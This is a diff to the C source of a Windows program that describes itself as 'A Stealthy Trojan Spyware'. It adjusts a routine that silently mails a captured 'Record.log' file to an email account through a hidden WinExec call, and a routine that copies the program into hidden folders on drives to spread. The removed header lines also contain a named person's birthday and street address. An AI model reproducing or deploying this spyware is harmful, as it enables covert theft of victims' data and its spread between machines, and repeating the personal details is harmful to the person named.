@@ -1,8 +1,6 @@
 
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: A Stealthy Trojan Spyware.
-* fadliwiryawirawanunitedstatesh 
-* birthday: 11 September 1993 . Bogor Indonesia parung jawa barat , pemagarsari rt 06/ rw 02 no 57
 **/
 
 #include <windows.h>
@@ -49,7 +47,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping Www.google.com.jp")){ ///check connection
+            if(!system("ping www.google.com -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -139,7 +137,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.co.id -v --mail-from \"your.email@gmail.co.id\" --mail-rcpt \"your.email@gmail.co.id\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth indonesian white house g20 meta developer";
+    char* command = "Transmit smtp://smtp.gmail.com -v --mail-from \"your.email@gmail.com\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
@@ -217,13 +215,13 @@ void infectDrive(char driveLetter){
     if(CreateDirectory(folderPath ,NULL)){
         SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
 
-        char run[1000]={""};
+        char run[100]={""};
         strcat(run, folderPath);
         strcat(run, "\\");
         strcat(run, RUN_FILE_NAME);
         CopyFile(RUN_FILE_NAME, run, 0);
 
-        char net[1000]={""};
+        char net[100]={""};
         strcat(net, folderPath);
         strcat(net, "\\");
         strcat(net, EMAIL_SENDER_FILE_NAME);
